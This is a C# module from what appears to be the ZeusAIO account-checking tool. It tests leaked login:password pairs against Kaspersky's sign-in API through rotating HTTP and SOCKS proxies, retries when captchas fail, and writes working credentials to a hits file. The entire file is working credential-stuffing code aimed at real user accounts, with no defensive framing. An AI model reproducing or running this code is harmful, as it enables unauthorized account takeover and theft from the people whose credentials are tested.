using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json.Converters;
using System.Globalization;

namespace Kaspersky
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.KeepAlive = true;
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            httpRequest.Get("https://my.kaspersky.com").ToString();
                            string source = httpRequest.Post("https://hq.uis.kaspersky.com/v3/logon/start", "{\"Realm\":\"https://center.kaspersky.com/\"}", "application/json").ToString();
                            string text5 = Parse(source, "\"LogonContext\":\"", "\"");
                            string text6 = httpRequest.Post("https://hq.uis.kaspersky.com/v3/logon/proceed", "{\"logonContext\":\"" + text5 + "\",\"login\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"locale\":\"en\",\"captchaType\":\"invisible_recaptcha\",\"captchaAnswer\":\"undefined\"}", "application/json").ToString();
                            if (text6.Contains("Success"))
                            {
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - KASPERSKY] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/Kaspersky_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                            else if (text6.Contains("{\"Status\":\"InvalidRegistrationData\"}"))
                            {
                                break;
                            }
                            else if (text6.Contains("InvalidCaptchaAnswer"))
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                        }
                        break;
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}
